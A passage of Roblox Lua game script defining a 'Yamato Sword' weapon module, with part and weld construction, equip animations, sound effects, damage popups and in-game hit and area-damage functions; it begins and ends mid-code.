Anim = "Fall"
	
RootJoint.C0 = clerp(RootJoint.C0,RootCFrame*CFrame.new(0,0,0)* CFrame.Angles(0,0,0),0.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,Necko * CFrame.Angles(0.5,0,0),0.3)
Right_Shoulder.C0 = clerp(Right_Shoulder.C0, CFrame.new(1.5, 0, -0.2) * CFrame.Angles(0.4,0,0.2), 0.3)
Left_Shoulder.C0 = clerp(Left_Shoulder.C0, CFrame.new(-1.5, 0, -0.2) * CFrame.Angles(0.4,0,-0.2), 0.3)
Right_Hip.C0=clerp(Right_Hip.C0,CFrame.new(1,-1,-0.2)*CFrame.Angles(-0.2,1.6,0),0.2)
Left_Hip.C0=clerp(Left_Hip.C0,CFrame.new(-1,-1,0)*CFrame.Angles(0,-1.6,0),0.2)

end


if #Effects > 0 then
for E = 1, #Effects do
if Effects[E]~=nil then
local Effect = Effects[E]

if Effect ~= nil then
	
local Part = Effect[1]
local Mode = Effect[2]
local Time = Effect[3]
local SizeX = Effect[4]
local SizeY = Effect[5]
local SizeZ = Effect[6]

if Effect[1].Transparency <= 1 then
if Effect[2] == "Block" then
Effect[1].CFrame = Effect[1].CFrame * CFrame.Angles(math.random(-50,50),math.random(-50,50),math.random(-50,50))

Mesh = Effect[1]:FindFirstChild("Mesh")
if Mesh ~= nil then
Mesh.Scale = Mesh.Scale + Vector3.new(Effect[4],Effect[5],Effect[6])
end

elseif Effect[2] == "Circle" then
	
if Effect[1]:FindFirstChild("Mesh") ~= nil then
Mesh=Effect[1].Mesh
Mesh.Scale = Mesh.Scale + Vector3.new(Effect[4],Effect[5],Effect[6])
end

Effect[1].Transparency = Effect[1].Transparency + 0.05

else
	
Part.Parent=nil

table.remove(Effects, E)

end
end
end
end
end
end
end
end}
module[2] = {"Yamato Sword",function()
Player = game:GetService("Players").LocalPlayer
Character = Player.Character 
PlayerGui = Player.PlayerGui 
Backpack = Player.Backpack 
Torso = Character.Torso 
Head = Character.Head 
LeftArm = Character["Left Arm"] 
LeftLeg = Character["Left Leg"] 
RightArm = Character["Right Arm"] 
RightLeg = Character["Right Leg"] 
LS = Torso["Left Shoulder"] 
LH = Torso["Left Hip"] 
RS = Torso["Right Shoulder"] 
RH = Torso["Right Hip"] 
ModelName = "Weapon"
ToolName = "Yamato"
attack = false
attacktype = 1
mindamage = 15
maxdamage = 25
crtmaxdamage = 45
omindamage = 15
omaxdamage = 25
ocrtmaxdamage = 45
crtrate = 12
fireboost = 0
iceboost = 0
darkboost = 0
Mode = "None"
ssh = false
atktypez = 1
Hitdeb = 0
ammo = 1
MMouse = nil
point = false
offset = 0
radv = 90
----------------------------
--Customize
DarkFire = true
MaxFT = 40
 
 
 
---------------------------------------------------------------------------------------------------------------------------------------
if Character:findFirstChild("EquippedVal",true) ~= nil then
Character:findFirstChild("EquippedVal",true).Parent = nil
end
ev = Instance.new("BoolValue")
ev.Parent = Character
ev.Name = "EquippedVal"
ev.Value = false
--player
player = nil
--welds
RW, LW , RWL, LWL = Instance.new("Weld"), Instance.new("Weld"), Instance.new("Weld"), Instance.new("Weld")
--what anim
anim = "none"
--other var
player = Player
ch = Character
--save shoulders
AoETrue = {}
RSH, LSH , RHL, LHL = ch.Torso["Right Shoulder"], ch.Torso["Left Shoulder"] , ch.Torso["Right Hip"] , ch.Torso["Left Hip"]
 
function RWFunc()
 RW.Part1 = ch["Right Arm"]
 RSH.Part1 = nil
end
function LWFunc()
 LW.Part1 = ch["Left Arm"]
 LSH.Part1 = nil
end
function RWLFunc()
 RWL.Part1 = ch["Right Leg"]
 RHL.Part1 = nil
 ch["Right Leg"].Name = "RightLeg"
 RightLeg.CanCollide = false
end
function LWLFunc()
 LWL.Part1 = ch["Left Leg"]
 LHL.Part1 = nil
 ch["Left Leg"].Name = "LeftLeg"
 LeftLeg.CanCollide = true
end
function RWLRem()
 RightLeg.Name = "Right Leg"
 RWL.Part1 = nil
 RHL.Part1 = ch["Right Leg"]
 RightLeg.CanCollide = false
end
function LWLRem()
 LeftLeg.Name = "Left Leg"
 LWL.Part1 = nil
 LHL.Part1 = ch["Left Leg"]
 LeftLeg.CanCollide = false
end
function RWRem()
 RW.Part1 = nil
 RSH.Part1 = ch["Right Arm"]
end
function LWRem()
 LW.Part1 = nil
 LSH.Part1 = ch["Left Arm"]
end
 
 
if Character:findFirstChild(ModelName,true) ~= nil then
Character:findFirstChild(ModelName,true).Parent = nil
 RHL.Part1 = ch["Right Leg"]
 LHL.Part1 = ch["Left Leg"]
 RSH.Part1 = ch["Right Arm"]
 LSH.Part1 = ch["Left Arm"]
end
 
 
 
local swordholder = Instance.new("Model")
swordholder.Name = ModelName
swordholder.Parent = Character
--derp
 RW.Part0 = ch.Torso
 RW.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, 0, 0)
 RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, 0, 0)
 RW.Parent = swordholder
 --
 LW.Part0 = ch.Torso
 LW.C0 = CFrame.new(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8)
 LW.C1 = CFrame.new(0, 0.5, 0)
 LW.Parent = swordholder
 --
 RWL.Part0 = ch.Torso
 RWL.C0 = CFrame.new(1, -1, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5)
 RWL.C1 = CFrame.new(0.5, 1, 0)
 RWL.Parent = swordholder
 --
 LWL.Part0 = ch.Torso
 LWL.C0 = CFrame.new(-1, -1, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8)
 LWL.C1 = CFrame.new(-0.5, 1, 0)
 LWL.Parent = swordholder
handlecolor = BrickColor.new("Really black")
scndryclr = BrickColor.new("Bright violet")
firepri = BrickColor.new("Bright red")
icepri = BrickColor.new("Bright blue")
local msh1 = Instance.new("CylinderMesh")
msh1.Scale = Vector3.new(1,1,1)
local msh2 = Instance.new("BlockMesh")
msh2.Scale = Vector3.new(1,1,1)
--
local msh3 = Instance.new("BlockMesh")
msh3.Scale = Vector3.new(1,1,1)
local msh3a = Instance.new("SpecialMesh")
msh3a.Scale = Vector3.new(1,1,1)
msh3a.MeshType = "Wedge"
local msh4 = Instance.new("BlockMesh")
msh4.Scale = Vector3.new(1,1,1)
local msh4a = Instance.new("SpecialMesh")
msh4a.Scale = Vector3.new(1,1,1)
msh4a.MeshType = "Wedge"
--
local msh5 = Instance.new("SpecialMesh")
msh5.Scale = Vector3.new(1,1,2)
msh5.MeshId = "http://www.roblox.com/asset/?id=3270017"
local msh6 = Instance.new("BlockMesh")
msh6.Scale = Vector3.new(1,1,0.5)
local msh7 = Instance.new("BlockMesh")
msh7.Scale = Vector3.new(1,1,1)
local msh8 = Instance.new("BlockMesh")
msh8.Scale = Vector3.new(0.5,1,1)
local prt1 = Instance.new("Part")
prt1.formFactor = 3
prt1.CanCollide = false
prt1.Name = "Handle"
prt1.Locked = true
prt1.Size = Vector3.new(0.2,1.5,0.2)
prt1.Parent = swordholder
msh1.Parent = prt1
prt1.BrickColor = handlecolor
local prt2 = Instance.new("Part")
prt2.formFactor = 3
prt2.CanCollide = false
prt2.Name = "HandleTop"
prt2.Locked = true
prt2.Size = Vector3.new(1.6,0.2,0.5)
prt2.Parent = swordholder
msh2.Parent = prt2
prt2.BrickColor = scndryclr
---
local prt3 = Instance.new("Part")
prt3.formFactor = 3
prt3.CanCollide = false
prt3.Name = "FlameBlade"
prt3.Locked = true
prt3.Size = Vector3.new(0.4,3,0.2)
prt3.Parent = swordholder
msh3.Parent = prt3
prt3.BrickColor = firepri
prt3.Reflectance = 0
local prt3a = Instance.new("Part")
prt3a.formFactor = 3
prt3a.CanCollide = false
prt3a.Name = "FlameBladeP1"
prt3a.Locked = true
prt3a.Size = Vector3.new(0.2,1,0.4)
prt3a.Parent = swordholder
msh3a.Parent = prt3a
prt3a.BrickColor = firepri
prt3a.Reflectance = 0
--
local prt4 = Instance.new("Part")
prt4.formFactor = 3
prt4.CanCollide = false
prt4.Name = "FrostBlade"
prt4.Locked = true
prt4.Size = Vector3.new(0.4,3,0.2)
prt4.Parent = swordholder
msh4.Parent = prt4
prt4.BrickColor = icepri
prt4.Reflectance = 0.5
local prt4a = Instance.new("Part")
prt4a.formFactor = 3
prt4a.CanCollide = false
prt4a.Name = "FrostBladeP1"
prt4a.Locked = true
prt4a.Size = Vector3.new(0.2,1,0.4)
prt4a.Parent = swordholder
msh4a.Parent = prt4a
prt4a.BrickColor = icepri
prt4a.Reflectance = 0.5
--
local prt5 = Instance.new("Part")
prt5.formFactor = 3
prt5.CanCollide = false
prt5.Name = "HandleRing"
prt5.Locked = true
prt5.Size = Vector3.new(1,1,0.2)
prt5.Parent = swordholder
msh5.Parent = prt5
prt5.BrickColor = scndryclr
prt5.Reflectance = 0
local DFlame = Instance.new("Fire")
DFlame.Parent = prt5
DFlame.Color = Color3.new(0.5,0,0.5)
DFlame.SecondaryColor = Color3.new(0.5,0,0.5)
DFlame.Heat = 25
DFlame.Size = 1
DFlame.Enabled = DarkFire
local prt6 = Instance.new("Part")
prt6.formFactor = 3
prt6.CanCollide = false
prt6.Name = "HandleP1"
prt6.Locked = true
prt6.Size = Vector3.new(0.2,1.5,0.2)
prt6.Parent = swordholder
msh6.Parent = prt6
prt6.BrickColor = scndryclr
prt6.Reflectance = 0
local prt7 = Instance.new("Part")
prt7.formFactor = 3
prt7.CanCollide = false
prt7.Name = "HandleP2"
prt7.Locked = true
prt7.Size = Vector3.new(0.7,0.2,0.2)
prt7.Parent = swordholder
msh7.Parent = prt7
prt7.BrickColor = scndryclr
prt7.Reflectance = 0
local prt8 = Instance.new("Part")
prt8.formFactor = 3
prt8.CanCollide = false
prt8.Name = "DarkBlade"
prt8.Locked = true
prt8.Size = Vector3.new(0.2,4,0.2)
prt8.Parent = swordholder
msh8.Parent = prt8
prt8.BrickColor = handlecolor
prt8.Transparency = 1
local hitbox = Instance.new("Part")
hitbox.formFactor = 3
hitbox.CanCollide = false
hitbox.Name = "Hitbox"
hitbox.Locked = true
hitbox.Size = Vector3.new(1,4,0.2)
hitbox.Parent = swordholder
hitbox.Transparency = 1
local hbw = Instance.new("Weld")
hbw.Parent = hitbox
hbw.Part0 = hitbox
hbw.Part1 = prt1
hbw.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
hbw.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(0, -2.95, 0)
 
local w1 = Instance.new("Weld")
w1.Parent = prt1
w1.Part0 = prt1
local w2 = Instance.new("Weld")
w2.Parent = prt2
w2.Part0 = prt2
w2.Part1 = prt1
w2.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w2.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(0, -0.85, 0)
--
local w3 = Instance.new("Weld")
w3.Parent = prt3
w3.Part0 = prt3
w3.Part1 = prt1
w3.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w3.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(0.25, -2.45, 0)
local w3a = Instance.new("Weld")
w3a.Parent = prt3a
w3a.Part0 = prt3a
w3a.Part1 = prt1
w3a.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w3a.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(-90),0) * CFrame.new(0.25, -4.45, 0)
local w4 = Instance.new("Weld")
w4.Parent = prt4
w4.Part0 = prt4
w4.Part1 = prt1
w4.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w4.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(-0.25, -2.45, 0)
local w4a = Instance.new("Weld")
w4a.Parent = prt4a
w4a.Part0 = prt4a
w4a.Part1 = prt1
w4a.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w4a.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(90),0) * CFrame.new(-0.25, -4.45, 0)
--
local w5 = Instance.new("Weld")
w5.Parent = prt5
w5.Part0 = prt5
w5.Part1 = prt1
w5.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w5.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(-0, -0.85, 0)
local w6 = Instance.new("Weld")
w6.Parent = prt6
w6.Part0 = prt6
w6.Part1 = prt1
w6.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w6.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(-0.5, -0, 0)
local w7 = Instance.new("Weld")
w7.Parent = prt7
w7.Part0 = prt7
w7.Part1 = prt1
w7.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w7.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(-0.25, 0.75, 0)
local w8 = Instance.new("Weld")
w8.Parent = prt8
w8.Part0 = prt8
w8.Part1 = prt1
w8.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0, 0)
w8.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0,0) * CFrame.new(0, -2.95, 0)
for ringi = 0 , math.rad(350) , math.rad(50) do
local ringm = Instance.new("BlockMesh")
ringm.Scale = Vector3.new(1,1.5,1)
local ringp = Instance.new("Part")
ringp.formFactor = 3
ringp.CanCollide = false
ringp.Name = "HandleRingP"..ringi
ringp.Locked = true
ringp.Size = Vector3.new(0.2,0.2,0.2)
ringp.Parent = swordholder
ringm.Parent = ringp
ringp.BrickColor = scndryclr
ringp.Reflectance = 0.1
local ringw = Instance.new("Weld")
ringw.Parent = ringp
ringw.Part0 = ringp
ringw.Part1 = prt5
ringw.C1 = CFrame.fromEulerAnglesXYZ(math.rad(90), -ringi, 0) * CFrame.new(0, 0 , 0)
ringw.C0 = CFrame.fromEulerAnglesXYZ(0, 0,0) * CFrame.new(-msh5.Scale.x/1.625, 0, 0) --* CFrame.new(-0.6, 0, 0) ---msh5.Scale.z/3.25
end
 
local Objects = {} 
function getAllObjects(obj)
 for a,v in pairs(obj:GetChildren()) do 
  if v:IsA("BasePart") then 
   table.insert(Objects,v) 
    end 
    if #v:GetChildren() > 0 then 
   getAllObjects(v) 
  end 
 end 
end 
getAllObjects(Workspace)
function Raycast(Start,End,Range) 
--
for ii = 0 , #Objects do
table.remove(Objects,ii)
end
getAllObjects(Workspace)
 local MA = math.abs
  local CF = CFrame.new(Start,End) 
   local CP = Start
    for i = 1, Range do--(Start - End).magnitude do 
     for b,v in pairs(Objects) do
      if v.Parent ~= nil then 
       local pos = Start + (CF.lookVector*i) 
        local dist = v.CFrame:pointToObjectSpace(pos) 
       if MA(dist.x) < v.Size.x/2 and MA(dist.y) < v.Size.y/2 and MA(dist.z) < v.Size.z/2 then 
        if v.Parent ~= Character or v.Parent ~= swordholder or v.Parent.Parent ~= Character then 
      return v,Start,pos 
      end
     end 
    end 
   end 
  end 
 return nil,Start,End 
end 
local RAP = Instance.new("Part")
RAP.formFactor = 0
RAP.CanCollide = false
RAP.Name = "RAPart"
RAP.Locked = true
RAP.Size = Vector3.new(1,1,1)
RAP.Parent = swordholder
RAP.Transparency = 1
local w = Instance.new("Weld")
w.Parent = RAP
w.Part0 = RAP
w.Part1 = RightArm
w.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
w.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0), 0, 0) * CFrame.new(0, 1, 0)
 
function unequipweld()
w1.Part1 = Torso
w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), math.rad(0)) * CFrame.new(0, 0,0)
w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(0),math.rad(180), math.rad(-150)) * CFrame.new(-1, -1.5, -0.6)
end
unequipweld()
 
function equipweld()
w1.Part1 = RAP
w1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(90)) * CFrame.new(0, 0, 0.2)
end
 
function ss(parent,p) --Slash
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait() 
SlashSound.Parent = nil
end))
end
function uss(parent,p) --unsheath
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "rbxasset://sounds\\unsheath.wav"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait() 
SlashSound.Parent = nil
end))
end
function cs(parent,p) --Magic Charge
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset/?id=2101137"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait() 
SlashSound.Parent = nil
end))
end
function ls(parent,p) --Lazer Sound
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset?id=1369158"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
function is(parent,p) --Ice Sound
local SlashSound = Instance.new("Sound")
local rndm = math.random(1,3)
if rndm == 1 then
SlashSound.SoundId = "rbxasset://sounds\\ice.ogg"
elseif rndm == 2 then
SlashSound.SoundId = "rbxasset://sounds\\ice2.ogg"
elseif rndm == 3 then
SlashSound.SoundId = "rbxasset://sounds\\ice3.ogg"
end
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
function fs(parent,p) --Fire Sound
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "http://www.roblox.com/asset/?id=31758982"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
function bs(parent,p) --Boom Sound
local SlashSound = Instance.new("Sound")
SlashSound.SoundId = "rbxasset://sounds/Rocket shot.wav"
SlashSound.Parent = parent
SlashSound.Volume = .7
SlashSound.Pitch = p
SlashSound.PlayOnRemove = true
coroutine.resume(coroutine.create(function()
wait()
SlashSound.Parent = nil
end))
end
--
 
 
function hideanim()
attack = true
 for i = 0 , 1 , 0.2 do
                wait()
  RW.C0 = CFrame.new(1+0.5*i,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80+67*i), math.rad(45), math.rad(-45+90*i))
  LW.C0 = CFrame.new(-1-0.5*i,0.5,-0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(80-80*i),math.rad(-45+45*i),math.rad(45-45*i))
        end 
  LWRem() 
 for i = 0 , 1 , 0.15 do
                wait()
  RW.C0 = CFrame.new(1.5,0.5+0.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(147+103*i), math.rad(45), math.rad(45-35*i))
        end  
  unequipweld()
 wait(0.1)
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1.5,1-0.5*i,-0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(250-250*i), math.rad(45-45*i), math.rad(10-10*i))
        end  
  RWRem()
attack = false
end
 
function equipanim()
attack = true
RWFunc()
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1.5,0.5,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(250*i), math.rad(45*i), math.rad(-10*i))
        end 
  equipweld()
 uss(Head,1)
 for i = 0 , 1 , 0.2 do
                wait()
  RW.C0 = CFrame.new(1.5,0.5+0.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(250-102.5*i), math.rad(45), math.rad(-10+27.5*i))
        end  
 for i = 0 , 1 , 0.15 do
                wait()
  RW.C0 = CFrame.new(1.5,1-0.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(147-67*i), math.rad(45), math.rad(17.5+27.5*i))
        end  
 LWFunc()
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1.5-0.5*i,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80), math.rad(45), math.rad(45-90*i))
  LW.C0 = CFrame.new(-1.5+0.5*i,0.5,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(80*i),math.rad(-45*i),math.rad(45*i))
        end 
attack = false
end
 
if (script.Parent.className ~= "HopperBin") then 
Tool = Instance.new("HopperBin") 
Tool.Parent = Backpack 
Tool.Name = ToolName
script.Parent = Tool 
end 
 
function damagesplat(dmg,hit,critornot,healornot)
local OffsetX = -2.5
local OffsetY = 5
local OffsetZ = 0
local bill = Instance.new("BillboardGui")
bill.Size = UDim2.new(1,0,1,0)
bill.Adornee = hit
bill.StudsOffset = Vector3.new(OffsetX,OffsetY,OffsetZ)
bill.Parent = hit.Parent
bill.Name = "DamageSplat"
local tex = Instance.new("TextLabel")
tex.Size = UDim2.new(5,0,2.5,0)
tex.Parent = bill
tex.Text = dmg
tex.BackgroundTransparency = 1
tex.ZIndex = 4
tex.FontSize = "Size24"
local tex2 = Instance.new("ImageLabel")
tex2.Size = UDim2.new(1,0,1,0)
tex2.Parent = tex
tex2.BackgroundTransparency = 1
tex2.Image = "http://www.roblox.com/asset/?id=42611276"
if critornot == true then
tex.TextColor3 = Color3.new(1,0.2,0.2)
elseif critornot == false then
tex.TextColor3 = Color3.new(0,0,0)
end
if healornot == true then
tex.TextColor3 = Color3.new(0.2,0.5,0.5)
end
coroutine.resume(coroutine.create(function()
wait(0.25)
for i = 0 , 1 , 0.075 do
wait()
bill.StudsOffset = Vector3.new(OffsetX,OffsetY+5*i,OffsetZ)
tex.TextTransparency = 1*i
end
bill.Parent = nil
end))
end
function FireEff(Part,Time,Color1,Color2,Color3)
local Firee = Part
local Spawn = Part
local colors = {} 
if Color1 ~= nil then
table.insert(colors,BrickColor.new(Color1))
end
if Color2 ~= nil then
table.insert(colors,BrickColor.new(Color2))
end
if Color3 ~= nil then
table.insert(colors,BrickColor.new(Color3))
end
if Color4 ~= nil then
table.insert(colors,BrickColor.new(Color4))
end
local Embers = {} 
local modelz = Instance.new("Model",Firee)
modelz.Name = "FireHolder"
for X = 1, 3 do
local f = Instance.new("Part") 
f.Parent = nil
f.BrickColor = colors[math.random(1, # colors)] 
f.Size = Vector3.new(1,1,1) 
f.formFactor = 1
f.Anchored = true 
f.Locked = true 
f.CanCollide = false 
f.Transparency = 0.5 
f.Name = "Fire"
f.TopSurface = 0
f.BottomSurface = 0
table.insert(Embers, f) 
end 
local R = 0
coroutine.resume(coroutine.create(function ()
repeat 
wait() 
R = R + 1
for X = 1, # Embers do 
Embers[X].Parent = modelz
local FM = math.fmod(R + X, # Embers) 
if FM == 1 then 
RandPos = Vector3.new(math.random(-Spawn.Size.x * 5, Spawn.Size.x * 5) / 10, Spawn.Size.y / 2, math.random(-Spawn.Size.x * 5, Spawn.Size.x * 5) / 10) 
RandDir = Vector3.new(math.random(-100,100), math.random(-100,100), math.random(-100,100)) 
Embers[X].CFrame = CFrame.new(Spawn.Position + RandPos, Spawn.Position + RandPos + RandDir) 
else 
Embers[X].CFrame = CFrame.new(Embers[X].Position + Vector3.new(0,0.5,0), Embers[X].Position + Vector3.new(0,0.5,0) + Embers[X].CFrame.lookVector) 
end 
end 
until R == Time
for i = 0 ,1 , 0.1 do
wait(0.2)
for X = 1, # Embers do 
Embers[X].Transparency = 0.5+0.5*i
end
end
for X = 1, # Embers do 
Embers[X].Parent = nil
end
end))
end
 
function OT(hit) --Normal Damage
if Hitdeb == 1 then return end
if hit.Parent == nil then return end
local hum = hit.Parent:findFirstChild("Humanoid")
if hum ~= nil and hum ~= Character.Humanoid then
local critrandomizer = math.random(1,crtrate)
if critrandomizer ~= 1 then
local rndmdamage = math.random(mindamage,maxdamage)
damagesplat(rndmdamage,hit,false)
hum:TakeDamage(rndmdamage)
elseif critrandomizer == 1 then
local rndmdamage = math.random(maxdamage,crtmaxdamage)
damagesplat(rndmdamage,hit,true)
hum:TakeDamage(rndmdamage)
end
Hitdeb = 1
end
end
 
function OTND(part) --No Debounce Damage
coroutine.resume(coroutine.create(function() 
local dd = false
while part.Parent ~= nil and not dd do
wait() 
local c = game.Workspace:GetChildren(); 
for i = 1, #c do 
local hum = c[i]:findFirstChild("Humanoid") 
if hum ~= nil and hum.Health ~= 0 then 
local head = c[i]:findFirstChild("Torso"); 
if head ~= nil then 
local targ = head.Position - part.Position;                                              ------------------------------------------------Local 
local mag = targ.magnitude; 
if mag <= 5 and c[i].Name ~= Player.Name then 
dd = true
local rndmdamage = math.random(1,7+5*math.random()) + fireboost
damagesplat(rndmdamage,head,false)
hum:TakeDamage(rndmdamage)
FireEff(head,150,"Bright red","Bright orange","Cool yellow")
part.Parent = nil
 
end 
end 
end 
end 
end 
end)) 
end
 
function AoE(p,magnitude,damage,critornot) 
 local c = game.Workspace:GetChildren();
 for i = 1, #c do
                local hum = c[i]:findFirstChild("Humanoid")
                if hum ~= nil and hum.Health ~= 0 then
  local head = c[i]:findFirstChild("Head");
                if head ~= nil then
  local targ = head.Position - p;
  local mag = targ.magnitude;
  if mag <= magnitude and c[i].Name ~= Character.Name then
  local foundd = false
  for ii = 1 , #AoETrue do
  if AoETrue[ii] == c[i].Name then
  --delay(1,function() table.remove(AoETrue,ii) end)
  --blast(2.5,0.5,"Bright red",prt2,false)
  foundd = true
  end
  end
  if foundd then
  end
  --
  if not foundd then
  hum:TakeDamage(damage)
  damagesplat(damage,head,critornot)
  table.insert(AoETrue,c[i].Name)
  --blast(2.5,0.5,"Bright red",prt2)
  end
  end
  end
                end
 end
end
function AoEP(p,magnitude,damage,critornot) 
 local c = game.Workspace:GetChildren();
 for i = 1, #c do
                local hum = c[i]:findFirstChild("Humanoid")
                if hum ~= nil and hum.Health ~= 0 then
  local head = c[i]:findFirstChild("Head");
                if head ~= nil then
  local targ = head.Position - p;
  local mag = targ.magnitude;
  if mag <= magnitude and c[i].Name ~= Character.Name then
  local foundd = false
  for ii = 1 , #AoETrue do
  if AoETrue[ii] == c[i].Name then
  --delay(1,function() table.remove(AoETrue,ii) end)
  --blast(2.5,0.5,"Bright red",prt2,false)
  foundd = true
  end
  end
  if foundd then
  end
  --
  if not foundd then
  hum:TakeDamage(damage)
  damagesplat(damage,head,critornot)
  c[i].Humanoid.Sit = true
  coroutine.resume(coroutine.create(function() 
local bp = Instance.new("BodyVelocity",c[i].Torso)
bp.maxForce = Vector3.new(math.huge,math.huge,math.huge)
bp.P = bp.P*2
bp.velocity = CFrame.new(c[i].Torso.Position , p).lookVector * 150 + Vector3.new(0,25,0)
coroutine.resume(coroutine.create(function() 
for i=1, 
bp.velocity.y/3 do 
bp.velocity = bp.velocity+Vector3.new(0,-4.25,0) 
wait() 
end  
bp.Parent = nil   
end))
c[i].Torso.RotVelocity = CFrame.new(c[i].Torso.Position , p).lookVector * 25
wait(0.4) c[i].Humanoid.Sit = false end))
  table.insert(AoETrue,c[i].Name)
  end
  end
  end
                end
 end
end
--
 
local LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
function effect(Color,Ref,LP,P1,returnn)
local effectsmsh = Instance.new("BlockMesh")
effectsmsh.Scale = Vector3.new(0.5,1,0.5)
effectsmsh.Name = "Mesh"
local effectsg = Instance.new("Part")
effectsg.formFactor = 3
effectsg.CanCollide = false
effectsg.Name = "Eff"
effectsg.Locked = true
effectsg.Anchored = true
effectsg.Size = Vector3.new(0.2,1,0.2)
effectsg.Parent = swordholder
effectsmsh.Parent = effectsg
effectsg.BrickColor = BrickColor.new(Color)
effectsg.Reflectance = Ref
local point1 = P1
local mg = (LP.p - point1.p).magnitude
effectsg.Size = Vector3.new(0.2,mg,0.2)
effectsg.CFrame = CFrame.new((LP.p+point1.p)/2,point1.p) * CFrame.Angles(math.rad(90),0,0)
if returnn then return effectsg end
coroutine.resume(coroutine.create(function()
if not returnn then
for i = 0 , 1 , 0.1 do
wait()
effectsg.Transparency = 1*i
end
wait()
effectsg.Parent = nil
end
end))
end
 
con = nil
function dmgcnnct(p)
con = p.Touched:connect(OT)
end
function dmgdc()
if con ~= nil then
con:disconnect()
Hitdeb = 0
end
end
function atktype(s,e)
coroutine.resume(coroutine.create(function ()
attacktype = e
wait(0.5)
repeat wait() until attack
attacktype = s
end))
end
 
hold = false 
function Combo1a()
attack=true
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1-0.5*i,0.5,-0.5-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(80+10*i), math.rad(45+45*i), math.rad(-45+45*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-45*i), math.rad(10*i), math.rad(0))
  LW.C0 = CFrame.new(-1,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80+10*i),math.rad(-45+45*i),math.rad(45-20*i))
    end 
 dmgcnnct(hitbox)
 ss(Head,1.5)
 for i = 0 , 1 , 0.2 do
